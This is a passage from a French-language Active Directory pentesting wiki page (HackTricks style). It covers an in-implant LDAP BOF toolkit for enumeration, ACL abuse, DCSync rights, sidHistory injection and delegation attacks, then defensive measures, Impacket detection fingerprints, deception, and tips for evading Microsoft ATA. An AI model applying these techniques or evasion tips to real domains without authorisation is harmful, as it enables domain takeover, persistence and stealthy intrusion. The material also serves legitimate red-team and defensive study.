La [collection LDAP BOF](https://github.com/P0142/LDAP-Bof-Collection) réimplémente des primitives LDAP de type bloodyAD sous forme de Beacon Object Files x64, qui s’exécutent entièrement dans un implant sur l’hôte (par exemple, Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis exécutent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité de la session ouverte actuelle sur LDAP (389), avec signature/scellement, ou sur LDAPS (636), avec confiance automatique dans le certificat. Aucun proxy socks ni artefact sur disque n’est donc nécessaire.<sup>[[4]](#references)</sup>

### Énumération LDAP depuis l’implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` et `get-groupmembers` résolvent les noms courts et les chemins d’OU en DN complets, puis extraient les objets correspondants.
- `get-object`, `get-attribute` et `get-domaininfo` récupèrent des attributs arbitraires (y compris des descripteurs de sécurité) ainsi que les métadonnées de la forêt et du domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` et `get-rbcd` exposent directement depuis LDAP les candidats au roasting, les paramètres de délégation et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` et `get-writable --detailed` analysent la DACL pour répertorier les trustees, les droits (GenericAll/WriteDACL/WriteOwner/écriture d’attributs) et l’héritage, afin d’identifier immédiatement les cibles d’une élévation de privilèges via les ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitives d’écriture LDAP pour l’escalade et la persistance

- Les BOF de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principals ou des comptes machine là où des droits sur l’OU existent. `add-groupmember`, `set-password`, `add-attribute` et `set-attribute` permettent de détourner directement des cibles dès que des droits d’écriture de propriété sont trouvés.
- Les commandes axées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` et `add-dcsync`, convertissent les droits WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mot de passe, en contrôle de l’appartenance aux groupes ou en privilèges de réplication DCSync, sans laisser de traces PowerShell/ADSI. Les commandes correspondantes `remove-*` nettoient les ACE injectées.

### Délégation, roasting et abus de Kerberos

- `add-spn`/`set-spn` rendent immédiatement un utilisateur compromis vulnérable au Kerberoast ; `add-asreproastable` (basculement UAC) le rend vulnérable à l’AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les indicateurs UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, activant des chemins d’attaque par délégation contrainte/non contrainte/RBCD et supprimant le besoin de PowerShell distant ou de RSAT.

### Injection de sidHistory, déplacement d’OU et configuration de la surface d’attaque

- `add-sidhistory` injecte des SID privilégiés dans l’historique SID d’un principal contrôlé (voir [Injection de SID-History](sid-history-injection.md)), permettant d’hériter discrètement des accès entièrement via LDAP/LDAPS.
- `move-object` modifie le DN/l’OU des ordinateurs ou des utilisateurs, permettant à un attaquant de déplacer des ressources vers des OU où des droits délégués existent déjà, avant d’abuser de `set-password`, `add-groupmember` ou `add-spn`.
- Des commandes de suppression ciblées (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un retour arrière rapide après la collecte d’identifiants ou la mise en place de la persistance par l’opérateur, en minimisant la télémétrie.

## AD -> Azure et Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures de défense pour la protection des identifiants**

- **Restrictions concernant les Domain Admins** : Il est recommandé de limiter la connexion des Domain Admins aux seuls Domain Controllers et d’éviter de les utiliser sur d’autres hôtes.
- **Privilèges des comptes de service** : Les services ne doivent pas s’exécuter avec des privilèges Domain Admin (DA), afin de préserver la sécurité.
- **Limitation temporaire des privilèges** : La durée des tâches nécessitant des privilèges DA doit être limitée. Pour cela, on peut utiliser : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Atténuation des relais LDAP** : Auditez les Event IDs 2889/3074/3075, puis imposez la signature LDAP ainsi que le channel binding LDAPS sur les DC/clients pour bloquer les tentatives de MITM/relais LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Empreintes au niveau protocole de l’activité Impacket

Pour détecter les pratiques AD courantes, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur**, tels que les binaires renommés, les noms de service, les fichiers batch temporaires ou les chemins de sortie. Établissez une référence du trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC et WMI généré par des clients Windows légitimes, puis recherchez les **particularités d’implémentation** qui subsistent même après modification par l’opérateur de `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Indicateurs autonomes à forte confiance** (après validation par rapport à votre propre référence) :
  - DCE/RPC authentifié utilisant `auth_context_id = 79231 + ctx_id`
  - Bourrage d’authentification DCE/RPC rempli avec `0xff`
  - Bind LDAP Kerberos plaçant un `AP-REQ` Kerberos brut directement dans `mechToken` de SPNEGO
  - Requêtes de négociation SMB2/3 avec des valeurs `ClientGuid` évoquant de l’ASCII
  - `IWbemLevel1Login::NTLMLogin` WMI utilisant l’espace de noms non standard `//./root/cimv2`
  - Valeurs de nonce Kerberos codées en dur
- **À privilégier comme indicateurs de corrélation/de score** :
  - Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituel/manquant, ou ordre des etype dans les TGS-REQ différent de celui de Windows natif
  - Messages NTLM Type 1 sans informations de version ou messages Type 3 avec des noms d’hôte nuls
  - NTLMSSP brut transporté dans DCE/RPC plutôt que dans SPNEGO, absence de trailers de vérification DCE/RPC ou incohérences entre les OID SPNEGO/Kerberos
  - Plusieurs de ces caractéristiques provenant du même hôte/utilisateur/de la même session/fenêtre temporelle sont bien plus significatives qu’un seul champ peu fiable
- **À utiliser comme enrichissement, et non comme alertes autonomes** :
  - Noms de fichiers par défaut, chemins de sortie, noms de service aléatoires, noms de fichiers batch temporaires, noms de comptes d’ordinateur par défaut et chaînes HTTP/WebDAV/RDP/MSSQL propres aux outils
  - Ces éléments sont faciles à modifier pour les opérateurs et servent surtout à expliquer pourquoi un regroupement inter-protocoles est suspect
- **Remarques opérationnelles** :
  - Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou une visibilité côté service
  - Validez-les avec des clients Samba/Linux, des appliances et des logiciels anciens avant de les convertir en alertes
  - Faites évoluer les détections de l’enrichissement -> à la chasse aux menaces -> aux alertes, à mesure que la confiance dans la référence augmente

### **Mise en œuvre de techniques de deception**

- La mise en œuvre de deception consiste à poser des pièges, comme des utilisateurs ou des ordinateurs leurres, dotés de caractéristiques telles que des mots de passe qui n’expirent jamais ou l’indicateur Trusted for Delegation. Une approche détaillée consiste à créer des utilisateurs avec des droits spécifiques ou à les ajouter à des groupes à privilèges élevés.<sup>[[2]](#references)</sup>
- Voici un exemple pratique utilisant des outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Pour en savoir plus sur le déploiement de techniques de deception, consultez [Deploy-Deception sur GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identification de la deception**

- **Pour les objets utilisateur** : Les indicateurs suspects comprennent un ObjectSID atypique, des connexions peu fréquentes, des dates de création inhabituelles et un faible nombre de mots de passe erronés.
- **Indicateurs généraux** : La comparaison des attributs d’objets potentiellement leurres avec ceux d’objets authentiques peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à détecter ce type de deception.

### **Contournement des systèmes de détection**

- **Contournement de la détection Microsoft ATA** :
  - **Énumération des utilisateurs** : Éviter l’énumération des sessions sur les Domain Controllers pour empêcher la détection par ATA.
  - **Usurpation de tickets** : Utiliser des clés **aes** pour créer les tickets permet d’échapper à la détection en évitant de rétrograder vers NTLM.
  - **Attaques DCSync** : Il est recommandé de les exécuter depuis un système autre qu’un Domain Controller pour éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## References

- [1] [Guide d’attaque des relations d’approbation de domaine](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forger des relations d’approbation pour la deception dans Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin à Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Collection LDAP BOF – Boîte à outils LDAP en mémoire pour l’exploitation d’Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Utiliser les hachages NTLM comme wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (laboratoire AD NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analyse d’Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon : prise de contrôle de comptes Active Directory via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Gestion des modifications des connexions de canal sécurisé Netlogon associées à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Voyage au cœur des interfaces Null Session et MS-RPC oubliées](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 4) - Recherche sur le contournement du filtrage SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 5) - Attaque de confiance Golden GMSA - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 6) - Attaque de confiance par modification du schéma - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA à EA avec ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Passer des administrateurs d’un domaine enfant aux administrateurs d’entreprise en 5 minutes en abusant d’AD CS : suite](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE dans la manche : conception de backdoors DACL Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Code source du module pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - Attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
